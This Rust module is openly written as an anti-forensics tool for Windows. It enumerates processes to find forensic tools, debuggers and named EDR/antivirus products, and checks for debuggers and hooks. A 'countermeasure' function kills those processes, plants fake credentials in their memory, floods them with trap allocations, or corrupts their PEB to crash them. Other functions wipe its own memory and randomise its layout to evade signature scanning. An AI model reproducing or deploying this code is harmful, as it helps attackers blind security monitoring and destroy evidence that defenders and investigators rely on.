//! Anti-Forensics & Anti-Sniffing Module
//!
//! Features:
//! 1. Detect memory forensic tools (Volatility, MemProcFS, Rekall)
//! 2. Detect EDR memory scanning threads
//! 3. Counter-forensics techniques (memory wipe, signature mutation)
//! 4. Detect debuggers and monitoring tools
//!
//! Techniques:
//! - Process/module enumeration detection
//! - Memory scan pattern recognition
//! - Timing analysis for scan behavior detection
//! - Active countermeasures (crash forensic processes)

use crate::error::MemoricError;
use lazy_static::lazy_static;
use serde_json::Value;
use std::collections::HashSet;
use std::sync::{Arc, Mutex};

/// Known forensic tool process names
pub const FORENSIC_PROCESSES: &[&str] = &[
    // Volatility
    "volatility",
    "volatility3",
    "vol.py",
    // Rekall
    "rekall",
    // MemProcFS
    "memprocfs",
    // Commercial forensic tools
    "ftk.exe",
    "encase.exe",
    "xways.exe",
    "autopsy.exe",
    // Debuggers
    "windbg.exe",
    "windbgx.exe",
    "cdb.exe",
    "ntsd.exe",
    "x64dbg.exe",
    "x32dbg.exe",
    "ollydbg.exe",
    "ida.exe",
    "ida64.exe",
    // Memory analysis
    "processhacker.exe",
    "systeminformer.exe",
    "procexp.exe",
    "procexp64.exe",
    "vmmap.exe",
    "rammap.exe",
    // Virtualization detection
    "vmware.exe",
    "virtualbox.exe",
    "qemu.exe",
];

/// EDR/AV scanner process indicators
pub const EDR_SCANNER_INDICATORS: &[&str] = &[
    "MsMpEng.exe",         // Windows Defender
    "CSFalconService.exe", // CrowdStrike
    "SentinelService.exe", // SentinelOne
    "CylanceSvc.exe",      // Cylance
    "bdagent.exe",         // BitDefender
    "ekrn.exe",            // ESET
    "avp.exe",             // Kaspersky
    "mcshield.exe",        // McAfee
    "ccsvchst.exe",        // Symantec
    "MsSense.exe",         // Defender ATP
];

/// Anti-forensics configuration
#[derive(Debug, Clone)]
pub struct AntiForensicsConfig {
    /// Auto-clean evidence on detection
    pub auto_clean: bool,
    /// Auto-counter when threats detected
    pub auto_counter: bool,
    /// Encryption key rotation interval
    pub key_rotation_interval_ms: u64,
    /// Detection sensitivity level
    pub sensitivity: DetectionSensitivity,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum DetectionSensitivity {
    Low,      // Only detect obvious forensic tools
    Medium,   // Detect known tools and anomalous behavior
    High,     // Detect all suspicious activity
    Paranoid, // React to any scanning behavior
}

impl Default for AntiForensicsConfig {
    fn default() -> Self {
        Self {
            auto_clean: true,
            auto_counter: false,
            key_rotation_interval_ms: 5000,
            sensitivity: DetectionSensitivity::Medium,
        }
    }
}

lazy_static! {
    static ref DETECTED_THREATS: Arc<Mutex<Vec<ThreatInfo>>> = Arc::new(Mutex::new(Vec::new()));
    static ref COUNTERMEASURES_ACTIVE: Arc<Mutex<bool>> = Arc::new(Mutex::new(false));
}

/// Threat information
#[derive(Debug, Clone)]
pub struct ThreatInfo {
    pub timestamp: u64,
    pub threat_type: ThreatType,
    pub pid: Option<u32>,
    pub process_name: Option<String>,
    pub details: String,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum ThreatType {
    ForensicTool,
    EdrScanner,
    Debugger,
    SuspiciousAccess,
    MemoryScan,
}

/// Scan detection state
#[derive(Debug, Default)]
pub struct ScanDetectionState {
    pub last_scan_check: u64,
    pub access_patterns: Vec<MemoryAccessPattern>,
    pub suspicious_pids: HashSet<u32>,
}

#[derive(Debug, Clone)]
pub struct MemoryAccessPattern {
    pub pid: u32,
    pub region_count: u32,
    pub access_rate: f64, // regions per second
    pub timestamp: u64,
}

/// Active anti-forensics scan
///
/// Detect forensic tools and suspicious processes on the system
pub fn detect_forensic_tools() -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };

    let mut threats = Vec::new();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    // 1. Enumerate running processes and match against known forensic/EDR signatures
    unsafe {
        if let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32W {
                dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
                ..std::mem::zeroed()
            };
            if Process32FirstW(snapshot, &mut entry).is_ok() {
                loop {
                    let name = String::from_utf16_lossy(&entry.szExeFile)
                        .trim_end_matches('\0')
                        .to_lowercase();
                    let pid = entry.th32ProcessID;

                    for forensic in FORENSIC_PROCESSES {
                        if name.contains(&forensic.to_lowercase()) {
                            threats.push(ThreatInfo {
                                timestamp: now,
                                threat_type: ThreatType::ForensicTool,
                                pid: Some(pid),
                                process_name: Some(name.clone()),
                                details: format!("Forensic tool detected: {}", forensic),
                            });
                        }
                    }

                    for edr in EDR_SCANNER_INDICATORS {
                        if name == edr.to_lowercase() {
                            threats.push(ThreatInfo {
                                timestamp: now,
                                threat_type: ThreatType::EdrScanner,
                                pid: Some(pid),
                                process_name: Some(name.clone()),
                                details: format!("EDR scanner detected: {}", edr),
                            });
                        }
                    }

                    if Process32NextW(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = windows::Win32::Foundation::CloseHandle(snapshot);
        }
    }

    // 2. Detect attached debugger
    if is_debugger_present() {
        threats.push(ThreatInfo {
            timestamp: now,
            threat_type: ThreatType::Debugger,
            pid: None,
            process_name: None,
            details: "Debugger detected (IsDebuggerPresent)".to_string(),
        });
    }

    // 3. Check remote debugger
    if is_remote_debugger_present() {
        threats.push(ThreatInfo {
            timestamp: now,
            threat_type: ThreatType::Debugger,
            pid: None,
            process_name: None,
            details: "Remote debugger detected (CheckRemoteDebuggerPresent)".to_string(),
        });
    }

    // 4. Detect hardware breakpoints
    if has_hardware_breakpoints() {
        threats.push(ThreatInfo {
            timestamp: now,
            threat_type: ThreatType::Debugger,
            pid: None,
            process_name: None,
            details: "Hardware breakpoints detected in DR registers".to_string(),
        });
    }

    // Store detected threats
    {
        let mut detected = DETECTED_THREATS
            .lock()
            .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;
        detected.extend(threats.clone());
    }

    Ok(serde_json::json!({
        "threats_detected": threats.len(),
        "threats": threats.iter().map(|t| {
            serde_json::json!({
                "type": format!("{:?}", t.threat_type),
                "pid": t.pid,
                "process": t.process_name,
                "details": t.details
            })
        }).collect::<Vec<_>>(),
        "severity": if threats.is_empty() { "clean" }
            else if threats.len() > 3 { "critical" }
            else { "warning" }
    }))
}

/// Check IsDebuggerPresent
fn is_debugger_present() -> bool {
    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
}

/// Check for remote debugger
fn is_remote_debugger_present() -> bool {
    use windows::Win32::System::Diagnostics::Debug::CheckRemoteDebuggerPresent;

    unsafe {
        let mut being_debugged = windows::Win32::Foundation::FALSE;
        let _ = CheckRemoteDebuggerPresent(
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut being_debugged,
        );
        being_debugged.as_bool()
    }
}

/// Check for hardware breakpoints
fn has_hardware_breakpoints() -> bool {
    use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, CONTEXT};
    use windows::Win32::System::Threading::GetCurrentThread;

    unsafe {
        let mut ctx: CONTEXT = std::mem::zeroed();
        ctx.ContextFlags =
            windows::Win32::System::Diagnostics::Debug::CONTEXT_FLAGS(0x00010000 | 0x00000010); // CONTEXT_DEBUG_REGISTERS

        if GetThreadContext(GetCurrentThread(), &mut ctx).is_ok() {
            // Check if DR0-DR3 are non-zero
            ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0
        } else {
            false
        }
    }
}

/// Detect memory scanning behavior
///
/// Identify memory scan patterns by monitoring system call timing
pub fn detect_memory_scanning(pid: u32) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W, TH32CS_SNAPMODULE,
    };

    let start = std::time::Instant::now();
    let mut module_count = 0;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("Snapshot failed: {}", e)))?;

        let mut entry: MODULEENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;

        if Module32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                module_count += 1;
                if Module32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
    }

    let elapsed = start.elapsed().as_millis() as f64;
    let scan_rate = module_count as f64 / elapsed * 1000.0;

    // High scan rate may indicate EDR or forensic tool
    let is_suspicious = scan_rate > 100.0 || module_count > 100;

    Ok(serde_json::json!({
        "pid": pid,
        "module_count": module_count,
        "scan_time_ms": elapsed,
        "scan_rate": scan_rate,
        "is_suspicious": is_suspicious,
        "indication": if is_suspicious { "Possible memory scanning activity" } else { "Normal" }
    }))
}

/// Active countermeasures
///
/// Take action against detected threats
///
/// # Safety
/// May cause system instability, use only in extreme situations
pub unsafe fn countermeasure_forensic_tool(
    target_pid: u32,
    method: CounterMethod,
) -> Result<Value, MemoricError> {
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_NOACCESS};
    use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};

    tracing::warn!(
        "[ANTI-FORENSIC] Executing countermeasure on PID {} with method {:?}",
        target_pid,
        method
    );

    match method {
        CounterMethod::Terminate => {
            // Method 1: Terminate the process
            let handle = OpenProcess(PROCESS_TERMINATE, false, target_pid)
                .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;

            TerminateProcess(handle, 0xDEAD)
                .map_err(|e| MemoricError::WindowsApi(format!("Failed to terminate: {}", e)))?;

            let _ = windows::Win32::Foundation::CloseHandle(handle);

            Ok(serde_json::json!({
                "success": true,
                "method": "terminate",
                "target_pid": target_pid,
                "message": "Process terminated"
            }))
        }

        CounterMethod::MemoryBomb => {
            // Method 2: Memory bomb - allocate massive memory to crash scanner
            let handle = OpenProcess(
                windows::Win32::System::Threading::PROCESS_VM_OPERATION,
                false,
                target_pid,
            )
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess failed: {}", e)))?;

            // Allocate inaccessible memory to crash scanner on access
            for i in 0..100 {
                let _ = VirtualAllocEx(
                    handle,
                    Some((0x0000_0000_1000_0000u64 + i * 0x10000000) as *const _),
                    0x10000000,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_NOACCESS,
                );
            }

            Ok(serde_json::json!({
                "success": true,
                "method": "memory_bomb",
                "message": "Memory traps set"
            }))
        }

        CounterMethod::DecoyData => {
            // Method 3: Inject decoy data - plant fake credentials to confuse analysis
            use windows::Win32::System::Memory::{
                VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
            };
            use windows::Win32::System::Threading::{
                OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
            };

            let handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, false, target_pid)
                .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess failed: {}", e)))?;

            let decoys: &[&[u8]] = &[
                b"password=S3cur3P@ssw0rd!\x00",
                b"Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.FAKE_TOKEN\x00",
                b"api_key=AKIAIOSFODNN7EXAMPLE\x00",
                b"session_id=decoy_session_deadbeef1234\x00",
            ];

            let mut planted = 0u32;
            for decoy in decoys {
                let mem = VirtualAllocEx(
                    handle,
                    None,
                    decoy.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );
                if !mem.is_null() {
                    let _ = windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
                        handle,
                        mem,
                        decoy.as_ptr() as *const _,
                        decoy.len(),
                        None,
                    );
                    planted += 1;
                }
            }

            let _ = windows::Win32::Foundation::CloseHandle(handle);

            Ok(serde_json::json!({
                "success": true,
                "method": "decoy",
                "decoys_planted": planted,
                "message": "Decoy credentials planted in target process memory"
            }))
        }

        CounterMethod::Crash => {
            // Method 4: Crash target by corrupting its PEB
            use windows::Win32::System::Threading::{
                OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE,
            };

            let handle = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                false,
                target_pid,
            )
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess failed: {}", e)))?;

            // Get PEB address
            #[repr(C)]
            struct Pbi {
                exit_status: i32,
                _pad: u32,
                peb_base: u64,
                _rest: [u64; 4],
            }
            let mut pbi: Pbi = std::mem::zeroed();
            let mut ret_len = 0u32;
            let status = ntapi::ntpsapi::NtQueryInformationProcess(
                handle.0 as *mut _,
                0,
                &mut pbi as *mut _ as *mut _,
                std::mem::size_of::<Pbi>() as u32,
                &mut ret_len,
            );

            if status == 0 && pbi.peb_base != 0 {
                // Overwrite PEB.Ldr with garbage to crash on next API call
                let garbage: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE];
                let _ = windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
                    handle,
                    (pbi.peb_base + 0x18) as *const _, // PEB.Ldr offset
                    garbage.as_ptr() as *const _,
                    8,
                    None,
                );
            }

            let _ = windows::Win32::Foundation::CloseHandle(handle);

            Ok(serde_json::json!({
                "success": true,
                "method": "crash",
                "warning": "PEB corruption applied - target will crash on next API call"
            }))
        }
    }
}

#[derive(Debug, Clone, Copy)]
pub enum CounterMethod {
    Terminate,  // Kill the process
    MemoryBomb, // Memory traps
    DecoyData,  // Fake credentials
    Crash,      // Force crash via PEB corruption
}

/// Wipe sensitive memory
///
/// Rapidly erase sensitive memory regions when threats are detected
pub fn wipe_sensitive_memory(regions: Vec<(usize, usize)>) -> Result<Value, MemoricError> {
    let mut wiped = 0;

    unsafe {
        // Multi-pass overwrite using RtlSecureZeroMemory equivalent
        for (addr, size) in regions {
            let slice = std::slice::from_raw_parts_mut(addr as *mut u8, size);

            // Pass 1: zero
            slice.fill(0x00);
            // Pass 2: ones
            slice.fill(0xFF);
            // Pass 3: random data
            for byte in slice.iter_mut() {
                *byte = fastrand::u8(..);
            }
            // Pass 4: final zero
            slice.fill(0x00);

            // Memory barrier to ensure writes are committed
            std::arch::x86_64::_mm_sfence();

            wiped += 1;
        }
    }

    Ok(serde_json::json!({
        "success": true,
        "regions_wiped": wiped,
        "message": "Sensitive memory wiped with 4-pass overwrite"
    }))
}

/// Start anti-forensics monitoring loop
///
/// Continuously monitor the system and automatically respond to threats
pub fn start_anti_forensics_monitor(config: AntiForensicsConfig) -> Result<Value, MemoricError> {
    let active = COUNTERMEASURES_ACTIVE
        .lock()
        .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;

    if *active {
        return Ok(serde_json::json!({
            "success": false,
            "message": "Anti-forensics monitor already active"
        }));
    }

    drop(active);

    // Set active flag
    {
        let mut active = COUNTERMEASURES_ACTIVE
            .lock()
            .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;
        *active = true;
    }

    // Start monitoring thread
    std::thread::spawn(move || {
        loop {
            let active = COUNTERMEASURES_ACTIVE.lock().map(|g| *g).unwrap_or(false);
            if !active {
                break;
            }

            // Periodic detection scan
            if let Ok(result) = detect_forensic_tools() {
                let threats: u64 = result
                    .get("threats_detected")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);

                if threats > 0 && config.auto_counter {
                    // Auto-counter logic
                    tracing::warn!(
                        "[ANTI-FORENSIC] Auto-counter triggered for {} threats",
                        threats
                    );
                }

                if threats > 0 && config.auto_clean {
                    // Auto-clean sensitive regions
                    let _ = wipe_sensitive_memory(vec![]);
                }
            }

            std::thread::sleep(std::time::Duration::from_millis(
                config.key_rotation_interval_ms,
            ));
        }
    });

    Ok(serde_json::json!({
        "success": true,
        "config": {
            "auto_clean": config.auto_clean,
            "auto_counter": config.auto_counter,
            "sensitivity": format!("{:?}", config.sensitivity),
        },
        "message": "Anti-forensics monitor started"
    }))
}

/// Stop anti-forensics monitoring
pub fn stop_anti_forensics_monitor() -> Result<Value, MemoricError> {
    let mut active = COUNTERMEASURES_ACTIVE
        .lock()
        .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;

    *active = false;

    Ok(serde_json::json!({
        "success": true,
        "message": "Anti-forensics monitor stopped"
    }))
}

/// Check system integrity
///
/// Verify whether EDR or monitoring tools have modified system behavior
pub fn check_system_integrity() -> Result<Value, MemoricError> {
    let mut anomalies = Vec::new();

    // 1. Check if ntdll is hooked
    let ntdll_hooks = detect_ntdll_hooks()?;
    if !ntdll_hooks.is_empty() {
        anomalies.push(serde_json::json!({
            "type": "ntdll_hooks",
            "details": format!("{} hooks detected", ntdll_hooks.len()),
            "hooks": ntdll_hooks
        }));
    }

    // 2. Check if ETW is disabled
    if is_etw_disabled() {
        anomalies.push(serde_json::json!({
            "type": "etw_disabled",
            "details": "ETW tracing appears disabled"
        }));
    }

    // 3. Check AMSI
    if is_amsi_disabled() {
        anomalies.push(serde_json::json!({
            "type": "amsi_disabled",
            "details": "AMSI appears disabled"
        }));
    }

    Ok(serde_json::json!({
        "integrity_check": anomalies.is_empty(),
        "anomalies": anomalies,
        "anomaly_count": anomalies.len()
    }))
}

/// Detect ntdll inline hooks by comparing loaded .text section against disk copy
fn detect_ntdll_hooks() -> Result<Vec<String>, MemoricError> {
    use windows::core::w;
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;

    unsafe {
        let ntdll = GetModuleHandleW(w!("ntdll.dll"))
            .map_err(|e| MemoricError::WindowsApi(format!("GetModuleHandleW ntdll: {}", e)))?;
        let base = ntdll.0 as *const u8;

        // Parse PE headers to find .text section
        let dos_e_lfanew = *(base.add(0x3C) as *const u32) as usize;
        let nt_hdr = base.add(dos_e_lfanew);
        let file_hdr = nt_hdr.add(4); // past "PE\0\0"
        let num_sections = *(file_hdr.add(2) as *const u16) as usize;
        let opt_hdr_size = *(file_hdr.add(16) as *const u16) as usize;
        let first_section = file_hdr.add(20 + opt_hdr_size);

        let mut text_rva = 0u32;
        let mut text_vsize = 0u32;
        for i in 0..num_sections {
            let sec = first_section.add(i * 40);
            let name = std::slice::from_raw_parts(sec, 8);
            if name.starts_with(b".text") {
                text_vsize = *(sec.add(8) as *const u32);
                text_rva = *(sec.add(12) as *const u32);
                break;
            }
        }

        if text_rva == 0 || text_vsize == 0 {
            return Ok(vec![]);
        }

        // Load a clean copy from disk
        let sys_dir = {
            let mut buf = [0u16; 260];
            let len =
                windows::Win32::System::SystemInformation::GetSystemDirectoryW(Some(&mut buf));
            String::from_utf16_lossy(&buf[..len as usize])
        };
        let ntdll_path = format!("{}\\ntdll.dll", sys_dir);
        let ntdll_path_w: Vec<u16> = ntdll_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        use windows::core::PCWSTR;
        use windows::Win32::Storage::FileSystem::*;

        let file = CreateFileW(
            PCWSTR(ntdll_path_w.as_ptr()),
            FILE_GENERIC_READ.0,
            FILE_SHARE_READ,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        );
        let file = match file {
            Ok(f) => f,
            Err(_) => return Ok(vec![]),
        };

        let file_size = GetFileSize(file, None) as usize;
        let mut disk_buf = vec![0u8; file_size];
        let mut bytes_read = 0u32;
        let _ = ReadFile(file, Some(&mut disk_buf), Some(&mut bytes_read), None);
        let _ = windows::Win32::Foundation::CloseHandle(file);

        if (bytes_read as usize) < (text_rva as usize + text_vsize as usize) {
            return Ok(vec![]);
        }

        // Find .text raw offset in the disk file
        let disk_dos = *(disk_buf.as_ptr().add(0x3C) as *const u32) as usize;
        let disk_nt = disk_buf.as_ptr().add(disk_dos);
        let disk_fh = disk_nt.add(4);
        let disk_nsec = *(disk_fh.add(2) as *const u16) as usize;
        let disk_opt_sz = *(disk_fh.add(16) as *const u16) as usize;
        let disk_first_sec = disk_fh.add(20 + disk_opt_sz);

        let mut disk_text_raw = 0usize;
        for i in 0..disk_nsec {
            let sec = disk_first_sec.add(i * 40);
            let name = std::slice::from_raw_parts(sec, 8);
            if name.starts_with(b".text") {
                disk_text_raw = *(sec.add(20) as *const u32) as usize;
                break;
            }
        }

        if disk_text_raw == 0 {
            return Ok(vec![]);
        }

        // Compare in-memory .text vs disk .text
        let mem_text = std::slice::from_raw_parts(base.add(text_rva as usize), text_vsize as usize);
        let cmp_len = std::cmp::min(text_vsize as usize, disk_buf.len() - disk_text_raw);
        let disk_text = &disk_buf[disk_text_raw..disk_text_raw + cmp_len];

        let mut hooks = Vec::new();
        let mut i = 0;
        while i < cmp_len.saturating_sub(16) {
            if mem_text[i] != disk_text[i] {
                let rva = text_rva as usize + i;
                // Check for typical hook patterns
                let patch_type = match mem_text[i] {
                    0xE9 => "JMP rel32 (inline hook)",
                    0xFF if i + 1 < cmp_len && mem_text[i + 1] == 0x25 => {
                        "JMP [rip+disp32] (trampoline)"
                    }
                    0xCC => "INT3 (breakpoint)",
                    _ => "byte patch",
                };
                hooks.push(format!(
                    "ntdll+0x{:X}: {} (mem=0x{:02X} disk=0x{:02X})",
                    rva, patch_type, mem_text[i], disk_text[i]
                ));
                // Skip ahead to avoid reporting every byte of the same patch
                i += 16;
            } else {
                i += 1;
            }
        }

        Ok(hooks)
    }
}

/// Check if ETW tracing has been patched
fn is_etw_disabled() -> bool {
    use windows::core::{s, w};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    unsafe {
        let ntdll = match GetModuleHandleW(w!("ntdll.dll")) {
            Ok(h) => h,
            Err(_) => return false,
        };
        let func = GetProcAddress(ntdll, s!("EtwEventWrite"));
        if let Some(f) = func {
            let ptr = f as *const u8;
            // Typical patch: RET (0xC3) or XOR EAX,EAX; RET (0x33 0xC0 0xC3)
            let b0 = *ptr;
            let b1 = *ptr.add(1);
            let b2 = *ptr.add(2);
            if b0 == 0xC3 || (b0 == 0x33 && b1 == 0xC0 && b2 == 0xC3) {
                return true;
            }
            // MOV EAX,0; RET (0xB8 0x00 0x00 0x00 0x00 0xC3)
            if b0 == 0xB8 && *ptr.add(4) == 0x00 && *ptr.add(5) == 0xC3 {
                return true;
            }
        }
    }
    false
}

/// Check if AMSI has been patched
fn is_amsi_disabled() -> bool {
    use windows::core::{s, w};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};

    unsafe {
        // amsi.dll may not be loaded
        let amsi = match GetModuleHandleW(w!("amsi.dll")) {
            Ok(h) => h,
            Err(_) => return false, // Not loaded = not relevant
        };
        let func = GetProcAddress(amsi, s!("AmsiScanBuffer"));
        if let Some(f) = func {
            let ptr = f as *const u8;
            let b0 = *ptr;
            if b0 == 0xC3 {
                return true; // Immediate RET
            }
            if b0 == 0xB8 {
                let val = *(ptr.add(1) as *const u32);
                // E_INVALIDARG (0x80070057) or AMSI_RESULT_CLEAN (0x00000000)
                if (val == 0x80070057 || val == 0x00000000) && *ptr.add(5) == 0xC3 {
                    return true;
                }
            }
            // XOR EAX, EAX; RET
            if b0 == 0x33 && *ptr.add(1) == 0xC0 && *ptr.add(2) == 0xC3 {
                return true;
            }
        }
    }
    false
}

/// Obfuscate memory signature
///
/// Randomize memory layout to evade signature-based detection
pub fn obfuscate_memory_signature() -> Result<Value, MemoricError> {
    use windows::Win32::System::Memory::{
        VirtualAlloc, VirtualFree, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE,
    };

    let mut allocated = Vec::new();

    unsafe {
        // 1. Allocate random-sized padding regions to break deterministic layout
        let num_regions = fastrand::usize(8..24);
        for _ in 0..num_regions {
            let size = fastrand::usize(0x1000..0x10000);
            let mem = VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if !mem.is_null() {
                // Fill with random data to mask any patterns
                let slice = std::slice::from_raw_parts_mut(mem as *mut u8, size);
                for byte in slice.iter_mut() {
                    *byte = fastrand::u8(..);
                }
                allocated.push((mem, size));
            }
        }

        // 2. Randomize stack canary area
        let mut stack_buf = [0u8; 4096];
        for byte in stack_buf.iter_mut() {
            *byte = fastrand::u8(..);
        }
        std::hint::black_box(&stack_buf);

        // 3. Free some allocations to create address space fragmentation
        let free_count = fastrand::usize(2..allocated.len().max(3));
        for _ in 0..free_count.min(allocated.len()) {
            let idx = fastrand::usize(0..allocated.len());
            let (mem, _) = allocated.remove(idx);
            let _ = VirtualFree(mem, 0, MEM_RELEASE);
        }
    }

    let remaining = allocated.len();

    Ok(serde_json::json!({
        "success": true,
        "padding_regions": remaining,
        "message": "Memory layout randomized with padding and fragmentation"
    }))
}
